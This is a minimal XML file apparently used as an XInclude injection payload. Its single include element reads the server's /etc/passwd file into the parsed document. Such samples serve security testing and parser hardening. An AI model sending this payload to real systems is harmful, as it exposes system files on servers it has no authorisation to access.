<?xml version="1.0" encoding="UTF-8"?>
<data xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
</data>